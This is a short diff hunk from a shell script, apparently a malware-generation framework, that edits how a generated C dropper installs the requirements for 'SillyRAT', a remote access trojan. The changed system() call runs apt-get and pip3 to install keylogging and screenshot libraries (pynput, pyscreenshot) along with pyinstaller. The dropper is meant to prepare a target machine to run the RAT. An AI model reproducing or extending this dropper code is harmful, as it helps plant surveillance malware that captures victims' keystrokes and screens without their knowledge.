@@ -10380,7 +10380,7 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "         printf(\"----------------------------------------------------\\\n\");" >> $Drop.c
       echo "" >> $Drop.c
       echo "            /* Install python3 and SillyRAT requirements */" >> $Drop.c
-      echo "            sleep(1);system(\"sudo apt-get update && apt-get install -y python3 && pip3 install tabulate pynput psutil pillow pyscreenshot pyinstaller\");" >> $Drop.c
+      echo "            sleep(1);system(\"sudo apt-get update;C=\$(pip3 show tabulate);if [ \"\$?\" -ne \"0\" ]; then apt-get install -y python3 && pip3 install tabulate pynput psutil pillow pyscreenshot pyinstaller;fi\");" >> $Drop.c
       echo "            printf(\"Done.. ALL $Drop requirements are satisfied.\\\n\");" >> $Drop.c
       echo "" >> $Drop.c
       echo "      }" >> $Drop.c
